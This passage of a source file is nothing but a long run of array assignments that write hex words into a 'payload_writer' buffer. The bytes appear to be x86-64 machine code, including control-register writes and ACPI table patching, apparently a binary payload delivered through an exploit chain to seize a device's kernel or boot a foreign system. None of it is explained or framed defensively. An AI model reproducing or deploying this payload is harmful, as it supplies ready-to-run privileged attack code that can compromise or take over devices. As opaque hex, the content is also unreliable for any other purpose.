  payload_writer[2784] = 0x02d882c7;
  payload_writer[2785] = 0x00000000;
  payload_writer[2786] = 0x82c70020;
  payload_writer[2787] = 0x000002e0;
  payload_writer[2788] = 0x00000001;
  payload_writer[2789] = 0x0f09508d;
  payload_writer[2790] = 0x6b48d2b6;
  payload_writer[2791] = 0x014814d2;
  payload_writer[2792] = 0x82c748fa;
  payload_writer[2793] = 0x000002d0;
  payload_writer[2794] = 0x00680000;
  payload_writer[2795] = 0xd882c748;
  payload_writer[2796] = 0x00000002;
  payload_writer[2797] = 0xc7000800;
  payload_writer[2798] = 0x0002e082;
  payload_writer[2799] = 0x00000200;
  payload_writer[2800] = 0x0a508d00;
  payload_writer[2801] = 0x48d2b60f;
  payload_writer[2802] = 0x4814d26b;
  payload_writer[2803] = 0xc748fa01;
  payload_writer[2804] = 0x0002d082;
  payload_writer[2805] = 0x70000000;
  payload_writer[2806] = 0x82c74800;
  payload_writer[2807] = 0x000002d8;
  payload_writer[2808] = 0x7e8e8000;
  payload_writer[2809] = 0x02e082c7;
  payload_writer[2810] = 0x00010000;
  payload_writer[2811] = 0x508d0000;
  payload_writer[2812] = 0xd2b60f0b;
  payload_writer[2813] = 0x14d26b48;
  payload_writer[2814] = 0x48fa0148;
  payload_writer[2815] = 0x02d082c7;
  payload_writer[2816] = 0x80000000;
  payload_writer[2817] = 0xc7487efe;
  payload_writer[2818] = 0x0002d882;
  payload_writer[2819] = 0x00800000;
  payload_writer[2820] = 0xe082c700;
  payload_writer[2821] = 0x04000002;
  payload_writer[2822] = 0x8d000000;
  payload_writer[2823] = 0xb60f0c50;
  payload_writer[2824] = 0xd26b48d2;
  payload_writer[2825] = 0xfa014814;
  payload_writer[2826] = 0xd082c748;
  payload_writer[2827] = 0x00000002;
  payload_writer[2828] = 0x487eff00;
  payload_writer[2829] = 0x02d882c7;
  payload_writer[2830] = 0x00000000;
  payload_writer[2831] = 0x82c70001;
  payload_writer[2832] = 0x000002e0;
  payload_writer[2833] = 0x00000003;
  payload_writer[2834] = 0x0f0d508d;
  payload_writer[2835] = 0x6b48d2b6;
  payload_writer[2836] = 0x014814d2;
  payload_writer[2837] = 0x82c748fa;
  payload_writer[2838] = 0x000002d0;
  payload_writer[2839] = 0x7f000000;
  payload_writer[2840] = 0xd882c748;
  payload_writer[2841] = 0x00000002;
  payload_writer[2842] = 0xc7010000;
  payload_writer[2843] = 0x0002e082;
  payload_writer[2844] = 0x00000100;
  payload_writer[2845] = 0x0e508d00;
  payload_writer[2846] = 0x48d2b60f;
  payload_writer[2847] = 0x4814d26b;
  payload_writer[2848] = 0x8948fa01;
  payload_writer[2849] = 0x0002d0b2;
  payload_writer[2850] = 0x82c74800;
  payload_writer[2851] = 0x000002d8;
  payload_writer[2852] = 0x60000000;
  payload_writer[2853] = 0x02e082c7;
  payload_writer[2854] = 0x00020000;
  payload_writer[2855] = 0x508d0000;
  payload_writer[2856] = 0xd2b60f0f;
  payload_writer[2857] = 0x14d26b48;
  payload_writer[2858] = 0x48fa0148;
  payload_writer[2859] = 0x0000c681;
  payload_writer[2860] = 0x89486000;
  payload_writer[2861] = 0x0002d0b2;
  payload_writer[2862] = 0xc6814800;
  payload_writer[2863] = 0x18000000;
  payload_writer[2864] = 0xd882c748;
  payload_writer[2865] = 0x00000002;
  payload_writer[2866] = 0xc7180000;
  payload_writer[2867] = 0x0002e082;
  payload_writer[2868] = 0x00000200;
  payload_writer[2869] = 0x10508d00;
  payload_writer[2870] = 0x48d2b60f;
  payload_writer[2871] = 0x4814d26b;
  payload_writer[2872] = 0x8948fa01;
  payload_writer[2873] = 0x0002d0b2;
  payload_writer[2874] = 0xc6814800;
  payload_writer[2875] = 0x08000000;
  payload_writer[2876] = 0xd882c748;
  payload_writer[2877] = 0x00000002;
  payload_writer[2878] = 0xc7040000;
  payload_writer[2879] = 0x0002e082;
  payload_writer[2880] = 0x00000200;
  payload_writer[2881] = 0x11508d00;
  payload_writer[2882] = 0x48d2b60f;
  payload_writer[2883] = 0x4814d26b;
  payload_writer[2884] = 0x8948fa01;
  payload_writer[2885] = 0x0002d0b2;
  payload_writer[2886] = 0xc6814800;
  payload_writer[2887] = 0x40000000;
  payload_writer[2888] = 0xd882c748;
  payload_writer[2889] = 0x00000002;
  payload_writer[2890] = 0xc7400000;
  payload_writer[2891] = 0x0002e082;
  payload_writer[2892] = 0x00000200;
  payload_writer[2893] = 0x12508d00;
  payload_writer[2894] = 0x83d2b60f;
  payload_writer[2895] = 0x6b4813c0;
  payload_writer[2896] = 0x014814d2;
  payload_writer[2897] = 0xb28948fa;
  payload_writer[2898] = 0x000002d0;
  payload_writer[2899] = 0x00ee8148;
  payload_writer[2900] = 0x48010000;
  payload_writer[2901] = 0x02d8b289;
  payload_writer[2902] = 0x82c70000;
  payload_writer[2903] = 0x000002e0;
  payload_writer[2904] = 0x00000001;
  payload_writer[2905] = 0x01e88788;
  payload_writer[2906] = 0x48c30000;
  payload_writer[2907] = 0x13913d8d;
  payload_writer[2908] = 0x31500000;
  payload_writer[2909] = 0x4115ffc0;
  payload_writer[2910] = 0xbf000018;
  payload_writer[2911] = 0x00000002;
  payload_writer[2912] = 0x18e615ff;
  payload_writer[2913] = 0x8b480000;
  payload_writer[2914] = 0x0018273d;
  payload_writer[2915] = 0x0000be00;
  payload_writer[2916] = 0x8148000e;
  payload_writer[2917] = 0x0e0000cf;
  payload_writer[2918] = 0x04b1e800;
  payload_writer[2919] = 0x8d480000;
  payload_writer[2920] = 0x00137c3d;
  payload_writer[2921] = 0xffc03100;
  payload_writer[2922] = 0x00180f15;
  payload_writer[2923] = 0x3d8b4800;
  payload_writer[2924] = 0x00001880;
  payload_writer[2925] = 0x8d48c931;
  payload_writer[2926] = 0xfff4b435;
  payload_writer[2927] = 0xfa8948ff;
  payload_writer[2928] = 0x186615ff;
  payload_writer[2929] = 0x8d480000;
  payload_writer[2930] = 0x0013673d;
  payload_writer[2931] = 0xffc03100;
  payload_writer[2932] = 0x0017e715;
  payload_writer[2933] = 0x5ac03100;
  payload_writer[2934] = 0x010ffac3;
  payload_writer[2935] = 0x0018b811;
  payload_writer[2936] = 0xd88e0000;
  payload_writer[2937] = 0xc08ed08e;
  payload_writer[2938] = 0xe88ee08e;
  payload_writer[2939] = 0x49da220f;
  payload_writer[2940] = 0x8949fc89;
  payload_writer[2941] = 0xc7c748f5;
  payload_writer[2942] = 0x06000000;
  payload_writer[2943] = 0x31fe8949;
  payload_writer[2944] = 0x948a41d2;
  payload_writer[2945] = 0x0001f124;
  payload_writer[2946] = 0xc2ff4800;
  payload_writer[2947] = 0x09e2c148;
  payload_writer[2948] = 0x14348d49;
  payload_writer[2949] = 0x248c8b41;
  payload_writer[2950] = 0x000001f4;
  payload_writer[2951] = 0x04e1c148;
  payload_writer[2952] = 0x48cf0148;
  payload_writer[2953] = 0x8348ce01;
  payload_writer[2954] = 0x834808ef;
  payload_writer[2955] = 0xc14808ee;
  payload_writer[2956] = 0xf3fd03e9;
  payload_writer[2957] = 0x48fca548;
  payload_writer[2958] = 0x0214258d;
  payload_writer[2959] = 0x83480000;
  payload_writer[2960] = 0x106af0e4;
  payload_writer[2961] = 0x00c68149;
  payload_writer[2962] = 0x41000002;
  payload_writer[2963] = 0xee894c56;
  payload_writer[2964] = 0x8348cb48;
  payload_writer[2965] = 0x8b4810ec;
  payload_writer[2966] = 0x00175705;
  payload_writer[2967] = 0xe014b900;
  payload_writer[2968] = 0x90bac890;
  payload_writer[2969] = 0x480003d0;
  payload_writer[2970] = 0x318bc109;
  payload_writer[2971] = 0x20e68040;
  payload_writer[2972] = 0xcaff0475;
  payload_writer[2973] = 0x00baf475;
  payload_writer[2974] = 0x48c890e0;
  payload_writer[2975] = 0x8840d009;
  payload_writer[2976] = 0x8348f038;
  payload_writer[2977] = 0x00082444;
  payload_writer[2978] = 0x14c28348;
  payload_writer[2979] = 0x21150b48;
  payload_writer[2980] = 0xb8000017;
  payload_writer[2981] = 0x0003d090;
  payload_writer[2982] = 0xe1800a8b;
  payload_writer[2983] = 0xff047540;
  payload_writer[2984] = 0x48f575c8;
  payload_writer[2985] = 0xc310c483;
  payload_writer[2986] = 0x0aff8040;
  payload_writer[2987] = 0x75f88941;
  payload_writer[2988] = 0x000dbf0a;
  payload_writer[2989] = 0x97e80000;
  payload_writer[2990] = 0x41ffffff;
  payload_writer[2991] = 0xebf8b60f;
  payload_writer[2992] = 0xf9894991;
  payload_writer[2993] = 0x39be0f41;
  payload_writer[2994] = 0x74ff8440;
  payload_writer[2995] = 0xc1ff490a;
  payload_writer[2996] = 0xffffd3e8;
  payload_writer[2997] = 0xc3edebff;
  payload_writer[2998] = 0x09ff8040;
  payload_writer[2999] = 0x7757478d;
  payload_writer[3000] = 0x30478d03;
  payload_writer[3001] = 0xfa8948c3;
  payload_writer[3002] = 0xefc1f789;
  payload_writer[3003] = 0xffe6e81c;
  payload_writer[3004] = 0x8b48ffff;
  payload_writer[3005] = 0x798d480a;
  payload_writer[3006] = 0x3a894801;
  payload_writer[3007] = 0x0188f789;
  payload_writer[3008] = 0x8318efc1;
  payload_writer[3009] = 0xcde80fe7;
  payload_writer[3010] = 0x48ffffff;
  payload_writer[3011] = 0x8d480a8b;
  payload_writer[3012] = 0x89480179;
  payload_writer[3013] = 0x88f7893a;
  payload_writer[3014] = 0x14efc101;
  payload_writer[3015] = 0xe80fe783;
  payload_writer[3016] = 0xffffffb4;
  payload_writer[3017] = 0x480a8b48;
  payload_writer[3018] = 0x4801798d;
  payload_writer[3019] = 0xf7893a89;
  payload_writer[3020] = 0xefc10188;
  payload_writer[3021] = 0x0fe78310;
  payload_writer[3022] = 0xffff9be8;
  payload_writer[3023] = 0x0a8b48ff;
  payload_writer[3024] = 0x01798d48;
  payload_writer[3025] = 0x893a8948;
  payload_writer[3026] = 0xc10188f7;
  payload_writer[3027] = 0xe7830cef;
  payload_writer[3028] = 0xff82e80f;
  payload_writer[3029] = 0x8b48ffff;
  payload_writer[3030] = 0x798d480a;
  payload_writer[3031] = 0x3a894801;
  payload_writer[3032] = 0xf0890188;
  payload_writer[3033] = 0x83fcb60f;
  payload_writer[3034] = 0x69e80fe7;
  payload_writer[3035] = 0x48ffffff;
  payload_writer[3036] = 0x8d480a8b;
  payload_writer[3037] = 0x89480179;
  payload_writer[3038] = 0x88f7893a;
  payload_writer[3039] = 0x04efc101;
  payload_writer[3040] = 0xe80fe783;
  payload_writer[3041] = 0xffffff50;
  payload_writer[3042] = 0x830a8b48;
  payload_writer[3043] = 0x8d480fe6;
  payload_writer[3044] = 0x89480179;
  payload_writer[3045] = 0x88f7893a;
  payload_writer[3046] = 0xff3ae801;
  payload_writer[3047] = 0x8b48ffff;
  payload_writer[3048] = 0x718d480a;
  payload_writer[3049] = 0x32894801;
  payload_writer[3050] = 0x53c30188;
  payload_writer[3051] = 0x49f88949;
  payload_writer[3052] = 0xd389f289;
  payload_writer[3053] = 0x45cb8949;
  payload_writer[3054] = 0x8043c931;
  payload_writer[3055] = 0x74000a3c;
  payload_writer[3056] = 0xc1ff4905;
  payload_writer[3057] = 0x8b49f4eb;
  payload_writer[3058] = 0xc6f64030;
  payload_writer[3059] = 0x480c7403;
  payload_writer[3060] = 0x4901468d;
  payload_writer[3061] = 0x06c60089;
  payload_writer[3062] = 0x31ebeb00;
  payload_writer[3063] = 0x0d8d48c0;
  payload_writer[3064] = 0x00001178;
  payload_writer[3065] = 0x8801148a;
  payload_writer[3066] = 0xff480614;
  payload_writer[3067] = 0xf88348c0;
  payload_writer[3068] = 0x49f17506;
  payload_writer[3069] = 0x4c060083;
  payload_writer[3070] = 0xf631c789;
  payload_writer[3071] = 0xfffee4e8;
  payload_writer[3072] = 0x4cde89ff;
  payload_writer[3073] = 0xdae8c789;
  payload_writer[3074] = 0x31fffffe;
  payload_writer[3075] = 0xc7894cf6;
  payload_writer[3076] = 0xfffed0e8;
  payload_writer[3077] = 0x4cf631ff;
  payload_writer[3078] = 0xc6e8c789;
  payload_writer[3079] = 0xbefffffe;
  payload_writer[3080] = 0x00000001;
  payload_writer[3081] = 0xe8c7894c;
  payload_writer[3082] = 0xfffffeb9;
  payload_writer[3083] = 0x894cf631;
  payload_writer[3084] = 0xfeafe8c7;
  payload_writer[3085] = 0x8944ffff;
  payload_writer[3086] = 0xc7894cde;
  payload_writer[3087] = 0xfffea4e8;
  payload_writer[3088] = 0x4cf631ff;
  payload_writer[3089] = 0x9ae8c789;
  payload_writer[3090] = 0x31fffffe;
  payload_writer[3091] = 0xc7894cf6;
  payload_writer[3092] = 0xfffe90e8;
  payload_writer[3093] = 0x4cf631ff;
  payload_writer[3094] = 0x86e8c789;
  payload_writer[3095] = 0x31fffffe;
  payload_writer[3096] = 0xc7894cf6;
  payload_writer[3097] = 0xfffe7ce8;
  payload_writer[3098] = 0x718d41ff;
  payload_writer[3099] = 0xc7894c01;
  payload_writer[3100] = 0xfffe70e8;
  payload_writer[3101] = 0x4cf631ff;
  payload_writer[3102] = 0x66e8c789;
  payload_writer[3103] = 0x31fffffe;
  payload_writer[3104] = 0x108b49c0;
  payload_writer[3105] = 0x74c13949;
  payload_writer[3106] = 0x0c8a410c;
  payload_writer[3107] = 0x020c8802;
  payload_writer[3108] = 0xebc0ff48;
  payload_writer[3109] = 0x08034def;
  payload_writer[3110] = 0x01418d49;
  payload_writer[3111] = 0x41008949;
  payload_writer[3112] = 0x490001c6;
  payload_writer[3113] = 0x03a8008b;
  payload_writer[3114] = 0x8d480c74;
  payload_writer[3115] = 0x89490150;
  payload_writer[3116] = 0x0000c610;
  payload_writer[3117] = 0xc35bedeb;
  payload_writer[3118] = 0x31178b48;
  payload_writer[3119] = 0x358b48c0;
  payload_writer[3120] = 0x000015a0;
  payload_writer[3121] = 0x000204c6;
  payload_writer[3122] = 0x48c0ff48;
  payload_writer[3123] = 0x0001003d;
  payload_writer[3124] = 0x48f17500;
  payload_writer[3125] = 0x01000781;
  payload_writer[3126] = 0xc0310000;
  payload_writer[3127] = 0x88060c8a;
  payload_writer[3128] = 0xff48020c;
  payload_writer[3129] = 0x003d48c0;
  payload_writer[3130] = 0x75000001;
  payload_writer[3131] = 0x078148ef;
  payload_writer[3132] = 0x00000100;
  payload_writer[3133] = 0x178b48c3;
  payload_writer[3134] = 0x8b48c031;
  payload_writer[3135] = 0x00155b0d;
  payload_writer[3136] = 0x0204c600;
  payload_writer[3137] = 0xc0ff4800;
  payload_writer[3138] = 0x20f88348;
  payload_writer[3139] = 0x8348f375;
  payload_writer[3140] = 0xc0312007;
  payload_writer[3141] = 0x48c68948;
  payload_writer[3142] = 0x8348def7;
  payload_writer[3143] = 0x07770ff8;
  payload_writer[3144] = 0x31748a40;
  payload_writer[3145] = 0x4005eb0f;
  payload_writer[3146] = 0x2f31748a;
  payload_writer[3147] = 0x02348840;
  payload_writer[3148] = 0x48c0ff48;
  payload_writer[3149] = 0x7520f883;
  payload_writer[3150] = 0x078348db;
  payload_writer[3151] = 0x5355c320;
  payload_writer[3152] = 0x18ec8348;
  payload_writer[3153] = 0x8d48c931;
  payload_writer[3154] = 0x4808245c;
  payload_writer[3155] = 0x8948fd89;
  payload_writer[3156] = 0xba08247c;
  payload_writer[3157] = 0x000041ed;
  payload_writer[3158] = 0x04358d48;
  payload_writer[3159] = 0x48000010;
  payload_writer[3160] = 0x44e8df89;
  payload_writer[3161] = 0xb9fffffe;
  payload_writer[3162] = 0x00000020;
  payload_writer[3163] = 0x0081a4ba;
  payload_writer[3164] = 0x358d4800;
  payload_writer[3165] = 0x00000fef;
  payload_writer[3166] = 0xe8df8948;
  payload_writer[3167] = 0xfffffe2b;
  payload_writer[3168] = 0xe8df8948;
  payload_writer[3169] = 0xffffff6d;
  payload_writer[3170] = 0xedbac931;
  payload_writer[3171] = 0x48000041;
  payload_writer[3172] = 0x0fe5358d;
  payload_writer[3173] = 0x10e80000;
  payload_writer[3174] = 0x31fffffe;
  payload_writer[3175] = 0x41edbac9;
  payload_writer[3176] = 0x8d480000;
  payload_writer[3177] = 0x000fd635;
  payload_writer[3178] = 0xdf894800;
  payload_writer[3179] = 0xfffdfae8;
  payload_writer[3180] = 0xbac931ff;
  payload_writer[3181] = 0x000041ed;
  payload_writer[3182] = 0xcd358d48;
  payload_writer[3183] = 0x4800000f;
  payload_writer[3184] = 0xe4e8df89;
  payload_writer[3185] = 0xb9fffffd;
  payload_writer[3186] = 0x00000100;
  payload_writer[3187] = 0x0081a4ba;
  payload_writer[3188] = 0x358d4800;
  payload_writer[3189] = 0x00000fc6;
  payload_writer[3190] = 0xe8df8948;
  payload_writer[3191] = 0xfffffdcb;
  payload_writer[3192] = 0xe8df8948;
  payload_writer[3193] = 0xfffffed0;
  payload_writer[3194] = 0x24448b48;
  payload_writer[3195] = 0xe8294808;
  payload_writer[3196] = 0x18203d48;
  payload_writer[3197] = 0x1b760000;
  payload_writer[3198] = 0xbac68948;
  payload_writer[3199] = 0x00001820;
  payload_writer[3200] = 0xb73d8d48;
  payload_writer[3201] = 0x3100000f;
  payload_writer[3202] = 0xad15ffc0;
  payload_writer[3203] = 0x48000013;
  payload_writer[3204] = 0x48ffc883;
  payload_writer[3205] = 0x5b18c483;
  payload_writer[3206] = 0x8948c35d;
  payload_writer[3207] = 0x48c931f8;
  payload_writer[3208] = 0x0d74d139;
  payload_writer[3209] = 0x0e3c8a40;
  payload_writer[3210] = 0x083c8840;
  payload_writer[3211] = 0xebc1ff48;
  payload_writer[3212] = 0x47c6c3ee;
  payload_writer[3213] = 0x4f8b0009;
  payload_writer[3214] = 0x31d23104;
  payload_writer[3215] = 0x76d139c0;
  payload_writer[3216] = 0x17040208;
  payload_writer[3217] = 0xebc2ff48;
  payload_writer[3218] = 0x88d8f7f4;
  payload_writer[3219] = 0x41c30947;
  payload_writer[3220] = 0x41564157;
  payload_writer[3221] = 0x55544155;
  payload_writer[3222] = 0x878d4853;
  payload_writer[3223] = 0x00008000;
  payload_writer[3224] = 0x48ec8348;
  payload_writer[3225] = 0x24448948;
  payload_writer[3226] = 0xfd894808;
  payload_writer[3227] = 0x31f58949;
  payload_writer[3228] = 0x0584c6c0;
  payload_writer[3229] = 0x00008000;
  payload_writer[3230] = 0xc0ff4800;
  payload_writer[3231] = 0x80003d48;
  payload_writer[3232] = 0xed750000;
  payload_writer[3233] = 0x4cea8948;
  payload_writer[3234] = 0x8d48ee89;
  payload_writer[3235] = 0x000f523d;
  payload_writer[3236] = 0xffc03100;
  payload_writer[3237] = 0x00132315;
  payload_writer[3238] = 0x7c8b4800;
  payload_writer[3239] = 0x09b90824;
  payload_writer[3240] = 0x48000000;
  payload_writer[3241] = 0xa5f3ee89;
  payload_writer[3242] = 0x24858d48;
  payload_writer[3243] = 0x48000080;
  payload_writer[3244] = 0x0f503d8d;
  payload_writer[3245] = 0x89480000;
  payload_writer[3246] = 0x31302444;
  payload_writer[3247] = 0xff3145c0;
  payload_writer[3248] = 0x8bf63145;
  payload_writer[3249] = 0x008010b5;
  payload_writer[3250] = 0xed15ff00;
  payload_writer[3251] = 0x48000012;
  payload_writer[3252] = 0x8018b58b;
  payload_writer[3253] = 0x8d480000;
  payload_writer[3254] = 0x000f373d;
  payload_writer[3255] = 0xffc03100;
  payload_writer[3256] = 0x0012d715;
  payload_writer[3257] = 0x10858b00;
  payload_writer[3258] = 0x48000080;
  payload_writer[3259] = 0x8024bd8d;
  payload_writer[3260] = 0x294c0000;
  payload_writer[3261] = 0xe80148e8;
  payload_writer[3262] = 0x4804508b;
  payload_writer[3263] = 0x8948c689;
  payload_writer[3264] = 0xe8102444;
  payload_writer[3265] = 0xffffff12;
  payload_writer[3266] = 0x8010858b;
  payload_writer[3267] = 0x89480000;
  payload_writer[3268] = 0xee294cee;
  payload_writer[3269] = 0x18b50348;
  payload_writer[3270] = 0x44000080;
  payload_writer[3271] = 0x38246c89;
  payload_writer[3272] = 0x8be8294c;
  payload_writer[3273] = 0x48040544;
  payload_writer[3274] = 0x30244403;
  payload_writer[3275] = 0x4804568b;
  payload_writer[3276] = 0x18244489;
  payload_writer[3277] = 0x24458d41;
  payload_writer[3278] = 0x80108589;
  payload_writer[3279] = 0x8b480000;
  payload_writer[3280] = 0x48182444;
  payload_writer[3281] = 0x4830c083;
  payload_writer[3282] = 0x8948c789;
  payload_writer[3283] = 0xe8202444;
  payload_writer[3284] = 0xfffffec6;
  payload_writer[3285] = 0x18858b48;
  payload_writer[3286] = 0x4c000080;
  payload_writer[3287] = 0x548be829;
  payload_writer[3288] = 0x8b480405;
  payload_writer[3289] = 0x48202444;
  payload_writer[3290] = 0x0824442b;
  payload_writer[3291] = 0x48e8014c;
  payload_writer[3292] = 0x80188589;
  payload_writer[3293] = 0x8b480000;
  payload_writer[3294] = 0x48202444;
  payload_writer[3295] = 0x60105c8d;
  payload_writer[3296] = 0x24448b48;
  payload_writer[3297] = 0x04408b10;
  payload_writer[3298] = 0x24e88348;
  payload_writer[3299] = 0x02e8c148;
  payload_writer[3300] = 0x24448948;
  payload_writer[3301] = 0x24448b28;
  payload_writer[3302] = 0x24448928;
  payload_writer[3303] = 0x7c39443c;
  payload_writer[3304] = 0x8e0f3c24;
  payload_writer[3305] = 0x00000168;
  payload_writer[3306] = 0x24448b48;
  payload_writer[3307] = 0x3d8d4810;
  payload_writer[3308] = 0x00000e70;
  payload_writer[3309] = 0xb8648b46;
  payload_writer[3310] = 0xe1894d24;
  payload_writer[3311] = 0x49ec294d;
  payload_writer[3312] = 0x8b41ec01;
  payload_writer[3313] = 0xc1892404;
  payload_writer[3314] = 0xc1d4b60f;
  payload_writer[3315] = 0xb60f10e9;
  payload_writer[3316] = 0x18e8c1f0;
  payload_writer[3317] = 0x41c9b60f;
  payload_writer[3318] = 0xc031c089;
  payload_writer[3319] = 0x11da15ff;
  payload_writer[3320] = 0x8b410000;
  payload_writer[3321] = 0x463d2404;
  payload_writer[3322] = 0x74504341;
  payload_writer[3323] = 0x53533d0c;
  payload_writer[3324] = 0x77745444;
  payload_writer[3325] = 0x0000cfe9;
  payload_writer[3326] = 0x748b4100;
  payload_writer[3327] = 0x8d482424;
  payload_writer[3328] = 0x000e313d;
  payload_writer[3329] = 0xffc03100;
  payload_writer[3330] = 0x0011af15;
  payload_writer[3331] = 0x748b4100;
  payload_writer[3332] = 0x8d482824;
  payload_writer[3333] = 0x000e2b3d;
  payload_writer[3334] = 0xffc03100;
  payload_writer[3335] = 0x00119b15;
  payload_writer[3336] = 0x748b4100;
  payload_writer[3337] = 0x89482424;
  payload_writer[3338] = 0x0040badf;
  payload_writer[3339] = 0x8d4c0000;
  payload_writer[3340] = 0x294c4073;
  payload_writer[3341] = 0xee0148ee;
  payload_writer[3342] = 0xfffddde8;
  payload_writer[3343] = 0x548b41ff;
  payload_writer[3344] = 0x894c0424;
  payload_writer[3345] = 0xf7894ce6;
  payload_writer[3346] = 0xfffdcde8;
  payload_writer[3347] = 0xd88948ff;
  payload_writer[3348] = 0x24442b48;
  payload_writer[3349] = 0x548b4108;
  payload_writer[3350] = 0x44030424;
  payload_writer[3351] = 0x8d493824;
  payload_writer[3352] = 0x89381674;
  payload_writer[3353] = 0x894c6443;
  payload_writer[3354] = 0x4d75ebf3;
  payload_writer[3355] = 0x4974f685;
  payload_writer[3356] = 0x28768b41;
  payload_writer[3357] = 0xf0c38148;
  payload_writer[3358] = 0x48000000;
  payload_writer[3359] = 0x294cdf89;
  payload_writer[3360] = 0xee0148ee;
  payload_writer[3361] = 0xe804568b;
  payload_writer[3362] = 0xfffffd8e;
  payload_writer[3363] = 0x28468b41;
  payload_writer[3364] = 0x4cf7894c;
  payload_writer[3365] = 0x548be829;
  payload_writer[3366] = 0x89480405;
  payload_writer[3367] = 0x442b48d8;
  payload_writer[3368] = 0x44030824;
  payload_writer[3369] = 0x8d483824;
  payload_writer[3370] = 0x0174139c;
  payload_writer[3371] = 0x89410000;
  payload_writer[3372] = 0x7be82846;
  payload_writer[3373] = 0xebfffffd;
  payload_writer[3374] = 0x3d8d480f;
  payload_writer[3375] = 0x00000d92;
  payload_writer[3376] = 0x15ffc031;
  payload_writer[3377] = 0x000010f4;
  payload_writer[3378] = 0x24548b41;
  payload_writer[3379] = 0xe6894c04;
  payload_writer[3380] = 0xe8df8948;
  payload_writer[3381] = 0xfffffd42;
  payload_writer[3382] = 0x24748b41;
  payload_writer[3383] = 0xde014804;
  payload_writer[3384] = 0xe8df8948;
  payload_writer[3385] = 0xfffffd4a;
  payload_writer[3386] = 0x245c2b48;
  payload_writer[3387] = 0x245c0308;
  payload_writer[3388] = 0x448b4838;
  payload_writer[3389] = 0xd9891824;
  payload_writer[3390] = 0xbd9c8942;
  payload_writer[3391] = 0x00008048;
  payload_writer[3392] = 0xf84c894a;
  payload_writer[3393] = 0xf3894854;
  payload_writer[3394] = 0xe9c7ff49;
  payload_writer[3395] = 0xfffffe8d;
  payload_writer[3396] = 0x28247c83;
  payload_writer[3397] = 0x00b84100;
  payload_writer[3398] = 0x48000000;
  payload_writer[3399] = 0x0f44d889;
  payload_writer[3400] = 0x28244449;
  payload_writer[3401] = 0x24442b48;
  payload_writer[3402] = 0x4c8b4808;
  payload_writer[3403] = 0x8d411824;
  payload_writer[3404] = 0x4900057c;
  payload_writer[3405] = 0xbc89c063;
  payload_writer[3406] = 0x00804885;
  payload_writer[3407] = 0xc0ff4100;
  payload_writer[3408] = 0xc17c8948;
  payload_writer[3409] = 0xc6c03154;
  payload_writer[3410] = 0x48000304;
  payload_writer[3411] = 0x8348c0ff;
  payload_writer[3412] = 0xf37554f8;
  payload_writer[3413] = 0x5649b848;
  payload_writer[3414] = 0x00545352;
  payload_writer[3415] = 0x43c60000;
  payload_writer[3416] = 0x89480108;
  payload_writer[3417] = 0x7b8d4803;
  payload_writer[3418] = 0x0006ba0a;
  payload_writer[3419] = 0x8d480000;
  payload_writer[3420] = 0x000cf235;
  payload_writer[3421] = 0xfca0e800;
  payload_writer[3422] = 0x8d48ffff;
  payload_writer[3423] = 0x08ba107b;
  payload_writer[3424] = 0x48000000;
  payload_writer[3425] = 0x0ce4358d;
  payload_writer[3426] = 0x8be80000;
  payload_writer[3427] = 0xc7fffffc;
  payload_writer[3428] = 0x12251843;
  payload_writer[3429] = 0x8d482016;
  payload_writer[3430] = 0x04ba1c7b;
  payload_writer[3431] = 0x48000000;
  payload_writer[3432] = 0x0cd1358d;
  payload_writer[3433] = 0x6fe80000;
  payload_writer[3434] = 0x48fffffc;
  payload_writer[3435] = 0x161225b8;
  payload_writer[3436] = 0x20304020;
  payload_writer[3437] = 0x5043c700;
  payload_writer[3438] = 0x0000a704;
  payload_writer[3439] = 0x20438948;
  payload_writer[3440] = 0x2810b848;
  payload_writer[3441] = 0x00020024;
  payload_writer[3442] = 0x89480040;
  payload_writer[3443] = 0x00b83043;
  payload_writer[3444] = 0x48fc0000;
  payload_writer[3445] = 0x48384389;
  payload_writer[3446] = 0x000000b8;
  payload_writer[3447] = 0x04802000;
  payload_writer[3448] = 0x43894880;
  payload_writer[3449] = 0x02b84840;
  payload_writer[3450] = 0x033000a0;
  payload_writer[3451] = 0x480000a1;
  payload_writer[3452] = 0x48484389;
  payload_writer[3453] = 0x8348df89;
  payload_writer[3454] = 0x33e854c3;
  payload_writer[3455] = 0x48fffffc;
  payload_writer[3456] = 0x18244c8b;
  payload_writer[3457] = 0x8d42d231;
  payload_writer[3458] = 0x00248504;
  payload_writer[3459] = 0x85890000;
  payload_writer[3460] = 0x00008028;
  payload_writer[3461] = 0xc5048d42;
  payload_writer[3462] = 0x00000024;
  payload_writer[3463] = 0x31344189;
  payload_writer[3464] = 0x2085c6c0;
  payload_writer[3465] = 0x00000080;
  payload_writer[3466] = 0x800885c6;
  payload_writer[3467] = 0x02000000;
  payload_writer[3468] = 0x80001584;
  payload_writer[3469] = 0xff480000;
  payload_writer[3470] = 0xfa8348c2;
  payload_writer[3471] = 0xf7f07514;
  payload_writer[3472] = 0x88d231d8;
  payload_writer[3473] = 0x00800885;
  payload_writer[3474] = 0x48c03100;
  payload_writer[3475] = 0x8348c2ff;
  payload_writer[3476] = 0x097425fa;
  payload_writer[3477] = 0xff158402;
  payload_writer[3478] = 0xeb00007f;
  payload_writer[3479] = 0x48d8f7ee;
  payload_writer[3480] = 0x30247c8b;
  payload_writer[3481] = 0x80208588;
  payload_writer[3482] = 0xc3e80000;
  payload_writer[3483] = 0x48fffffb;
  payload_writer[3484] = 0x20247c8b;
  payload_writer[3485] = 0xfffbb9e8;
  payload_writer[3486] = 0x5c2b48ff;
  payload_writer[3487] = 0x89480824;
  payload_writer[3488] = 0x748b48ef;
  payload_writer[3489] = 0x83480824;
  payload_writer[3490] = 0x894848c4;
  payload_writer[3491] = 0x415d5bda;
  payload_writer[3492] = 0x415d415c;
  payload_writer[3493] = 0xe95f415e;
  payload_writer[3494] = 0xfffffb7e;
  payload_writer[3495] = 0x83ffc883;
  payload_writer[3496] = 0x127704ff;
  payload_writer[3497] = 0x000001b8;
  payload_writer[3498] = 0xf9884000;
  payload_writer[3499] = 0xe2d3c289;
  payload_writer[3500] = 0xe0d3d189;
  payload_writer[3501] = 0x48c3c8ff;
  payload_writer[3502] = 0x0ef6358b;
  payload_writer[3503] = 0x09480000;
  payload_writer[3504] = 0x02468afe;
  payload_writer[3505] = 0x067401a8;
  payload_writer[3506] = 0x88fee083;
  payload_writer[3507] = 0x8a400246;
  payload_writer[3508] = 0xd040027e;
  payload_writer[3509] = 0x07e783ef;
  payload_writer[3510] = 0xffffbfe8;
  payload_writer[3511] = 0x104689ff;
  payload_writer[3512] = 0xc0200fc3;
  payload_writer[3513] = 0x48c28948;
  payload_writer[3514] = 0xffffe281;
